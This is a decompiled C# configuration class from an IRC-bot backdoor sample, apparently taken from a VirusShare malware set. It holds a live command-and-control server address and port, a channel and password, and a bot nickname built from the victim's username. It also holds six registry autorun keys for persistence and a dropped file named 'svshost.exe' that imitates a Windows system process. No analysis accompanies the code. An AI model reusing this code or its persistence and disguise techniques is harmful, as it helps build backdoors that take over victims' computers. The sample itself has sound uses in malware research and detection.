// Decompiled with JetBrains decompiler
// Type: Irc9.Config
// Assembly: Irc9, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E7A76116-F62B-4512-BE9B-418015CDF203
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Backdoor.MSIL.IrcBot.ts-ca7c95003f1d98515fb57c5abb26f6ed9b53d83503d9e6f6d3082ef1428ffdee.exe

using System;
using System.Text;
using System.Windows.Forms;

namespace Irc9
{
  internal class Config
  {
    public static string SERVER = "tonido.zapto.org";
    public static int PORT = 6667;
    public static string CHANNEL = "#Sxf";
    public static string REALNAME = "Stoki9";
    public static string CHANPASS = "chanpass";
    public static Random rnd = new Random();
    public static int rndNumber = Config.rnd.Next(1000, 10000);
    public static string nick = SystemInformation.UserName.ToString();
    public static string NICK = Config.nick + (object) Config.rndNumber;
    public static string[] regkeys = new string[6]
    {
      "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
      "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices",
      "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\load",
      "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\run",
      "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad",
      "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Terminal Server\\Install\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
    };
    public static string BName = "svshost.exe";
    public static string BPath = "C:\\Windows\\";
    public static string BStart = "Windows Services";

    private static string RandomString(int size, bool lowerCase)
    {
      StringBuilder stringBuilder = new StringBuilder();
      Random random = new Random();
      for (int index = 0; index < size; ++index)
      {
        char ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26.0 * random.NextDouble() + 65.0)));
        stringBuilder.Append(ch);
      }
      return lowerCase ? stringBuilder.ToString().ToLower() : stringBuilder.ToString();
    }
  }
}
